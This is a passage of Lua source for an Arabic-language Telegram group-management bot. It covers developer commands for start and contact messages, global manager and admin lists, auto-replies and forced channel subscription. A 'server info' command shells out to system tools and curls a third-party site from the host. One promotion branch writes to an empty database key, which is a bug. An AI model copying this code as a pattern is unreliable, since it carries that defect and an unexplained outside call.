send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
local inline = {
{{text = 'الـمـطـور', url="http://t.me/"..SUDOUSER}},
{{text = 'اضف '..Name_Bot..' الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},
} 
local start = database:get(bot_id.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⋄مرحبا عزيزي انا بوت اسمي "..Name_Bot.."\n⋄اختصائي حمايه جروبات من الدرجه الاوله\n⋄طريقه تفعيلي في المجموعات\n⋄1-قم بي اضافتي الي مجموعتك\n⋄2-قم بي رفعي مشرف مع كامل الصلاحيات\n⋄3-قم بي كتابه امر التفعيل {تفعيل} في الدردشه"
end
send_inline_key(msg.chat_id_,Start_Source,nil,inline)
return false
end

if text == 'جلب كليشه التواصل ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end   
local twasl = database:get(bot_id.."twasl:Bot")
if twasl then 
twasl_Source = twasl
else
twasl_Source = "⋄تم ارسال رسالتك\n⋄سيتم رد في اقرب وقت"
end
send(msg.sender_user_id_, msg.id_,twasl_Source)
return false
end

if text == 'تفعيل التواصل ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n⋄تم تفعيل التواصل ' 
else
Text = '\n⋄بالتاكيد تم تفعيل التواصل '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n⋄تم تعطيل التواصل' 
else
Text = '\n⋄بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n⋄تم تفعيل البوت الخدمي ' 
else
Text = '\n⋄بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n⋄تم تعطيل البوت الخدمي' 
else
Text = '\n⋄بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء ☉' then   
send(msg.chat_id_, msg.id_,' ⋄الغاء حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,' ⋄تم حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'ضع كليشه ستارت ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ⋄ارسل لي الكليشه الان')
return false
end

if text and database:get(bot_id..'twasl:Bots') then
if text == 'الغاء' or text == 'الغاء ☉' then   
send(msg.chat_id_, msg.id_,' ⋄الغاء حفظ كليشه تواصل')
database:del(bot_id..'twasl:Bots') 
return false
end
database:set(bot_id.."twasl:Bot",text)  
send(msg.chat_id_, msg.id_,' ⋄تم حفظ كليشه تواصل')
database:del(bot_id..'twasl:Bots') 
return false
end
if text == 'ضع كليشه تواصل ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
database:set(bot_id..'twasl:Bots',true) 
send(msg.chat_id_, msg.id_,' ⋄ارسل لي الكليشه الان')
return false
end

if text == ("المدراء العامين ☉") then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id.."Gmanager")
t = "\n⋄قائمة المدراء في البوت \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⋄لا يوجد مدرا عامين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح المدراء العامين ☉") then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
database:del(bot_id.."Gmanager")
send(msg.chat_id_, msg.id_, "\n⋄تم مسح قائمة المدراء العامين  ")
end

if text == 'مسح كليشه التواصل ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
database:del(bot_id..'twasl:Bot') 
send(msg.chat_id_, msg.id_,' ⋄تم مسح كليشه تواصل')
end

if text == 'مسح كليشه ستارت ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ⋄تم مسح كليشه ستارت')
end
if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end    
send(msg.chat_id_, msg.id_, ' ⋄تم اعاده تشغيل البوت') 
dofile('INFOBOT.lua')  
dofile('Black.lua')  
end 
if text == ("الردود المتعدده ☉") and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
local list = database:smembers(bot_id.."botss:Black:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
end
if #list == 0 then
text = "لا توجد ردود متعدده"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text == "اضف رد متعدد ☉" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:set(bot_id.."botss:Black:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"⋄ارسل الرد الذي اريد اضافته")
end
if text == "مسح رد متعدد ☉" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:set(bot_id.."botss:Black:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"⋄ارسل الان الكلمه لمسحها ")
end
if text == 'اضف رد عام ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
send(msg.chat_id_, msg.id_,' ⋄ارسل الكلمه تريد اضافتها')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == ("مسح الردود العامه ☉") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
local list = database:smembers(bot_id..'List:Rd:Sudo')
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Add:Rd:Sudo:File"..v)
database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
database:del(bot_id..'List:Rd:Sudo')
end
send(msg.chat_id_, msg.id_," ⋄تم مسح الردود العامه")
end
if text == ("الادمنيه العامين ☉") then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id.."Gmod:User")
t = "\n⋄قائمة الادمنيه في البوت \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⋄لا يوجد ادمنيه عامين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الادمنيه العامين ☉") then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
database:del(bot_id.."Gmod:User")
send(msg.chat_id_, msg.id_, "\n⋄تم مسح قائمة الادمنيه العامين  ")
end
if text == 'ضع رد بوت ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:set(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,' ⋄ارسل رد الان')
return false
end
if text and database:get(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' then 
database:del(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ⋄تم الغاء حفظ رد بوت')
return false
end
database:set(bot_id..'TEXT_BOT',text)
database:del(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ⋄تم حفظ رد بوت')
return false
end
if text == ("الردود العامه ☉") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n⋄قائمة الردود العامه \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
db = 'متحركه'
elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
db = 'بصمه'
elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
db = 'ملصق'
elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
db = 'رساله'
elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
db = 'صوره'
elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
db = 'فيديو'
elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
db = 'ملف'
elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
db = 'اغنيه'
end
text = text..""..k.." >> ("..v..") »> {"..db.."}\n"
end
if #list == 0 then
text = " ⋄لا يوجد ردود عامه"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text == 'مسح رد عام ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
send(msg.chat_id_, msg.id_,' ⋄ارسل الكلمه تريد مسحها')
database:set(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'معلومات السيرفر ☉' or text == 'السيرفر' then
if not DEV(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المبرمج لاستخدام هذا الامر')
return false
end 
local inline = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
local server = io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '[BY AHMEDYAD](t.me/UUOUOU_7)\n☉✔{ نظام التشغيل } ⊰•\n`'"$linux_version"'`' 
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ الذاكره العشوائيه } ⊰•\n`'"$memUsedPrc"'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ وحـده الـتـخـزيـن } ⊰•\n`'"$HardDisk"'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ الـمــعــالــج } ⊰•\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ موقـع الـسـيـرفـر } ⊰•\n`'`curl https://devdeiveddev.ml/IP/Location.php`'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ الــدخــول } ⊰•\n`'`whoami`'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n`'"$uptime"'`'
]]):read('*all')
send_inline_key(msg.chat_id_,server,nil,inline,msg.id_/2097152/0.5)
end
if text and text:match("^تنزيل ادمن عام @(.*)$") and SudoBot3(msg)  then
local username = text:match("^تنزيل ادمن عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Gmod:User', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الادمنيه العامين'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل ادمن عام (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^تنزيل ادمن عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Gmod:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الادمنيه العامين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من الادمنيه العامين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == 'حساب العمر' then
send(msg.chat_id_,msg.id_, ' حساب العمر ارسل `احسب + تاريخ ميلادك`\nمثلا احسب 2005/5/21') 
return false
end
if text == 'الابراج' then
send(msg.chat_id_,msg.id_, ' الابراج ارسل `برج + برجك`\nيمكنك معرفه برجك من قسم حساب العمر') 
return false
end
if text == 'معاني الاسما' then
send(msg.chat_id_,msg.id_, ' معاني الاسما ارسل `معني + اسمك` ') 
return false
end
if text == 'زخرفه' then
send(msg.chat_id_,msg.id_, ' الزخرفه ارسل `زخرفه + الكلمه` ') 
return false
end
if text == '☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉' then
send(msg.chat_id_,msg.id_, ' اختر من الاوامر بلكيبورد ') 
return false
end
if text == ("مسح المطورين الثانين ☉") then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
database:del(bot_id.."Sudo:bot2")
send(msg.chat_id_, msg.id_, "\n⋄تم مسح قائمة المطورين الثانين  ")
end
if text and text:match("^رفع مدير عام @(.*)$") and SudoBot3(msg)  then
local username = text:match("^رفع مدير عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'Gmanager', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير عام'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مدير عام (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^رفع مدير عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Gmanager', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and text:match("^تنزيل مدير عام @(.*)$") and SudoBot3(msg)  then
local username = text:match("^تنزيل مدير عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Gmanager', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدراء العامين'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير عام (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^تنزيل مدير عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Gmanager', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدراء العامين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من المدراء العامين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("المطورين الثانين ☉") then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id.."Sudo:bot2")
t = "\n⋄قائمة مطورين الثانين للبوت \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⋄لا يوجد مطورين ثانيين"
end
send(msg.chat_id_, msg.id_, t)
end

if text and text:match("^رفع ادمن عام @(.*)$") and SudoBot3(msg)  then
local username = text:match("^رفع ادمن عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته ادمن عام'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع ادمن عام (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^رفع ادمن عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
